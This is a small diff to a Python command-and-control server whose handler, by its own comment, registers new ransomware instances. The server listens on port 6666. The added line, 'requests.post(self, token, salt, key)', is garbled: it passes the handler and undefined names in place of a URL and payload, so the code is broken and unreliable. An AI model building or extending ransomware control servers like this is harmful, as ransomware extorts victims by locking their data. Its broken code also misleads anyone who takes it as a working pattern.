@@ -19,7 +19,7 @@ class CNC(CNCBase):
 
     def post_new(self, path:str, params:dict, body:dict)->dict:
         # used to register new ransomware instance
-        return {"status":"KO"}
+        requests.post(self, token, salt, key)
 
            
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
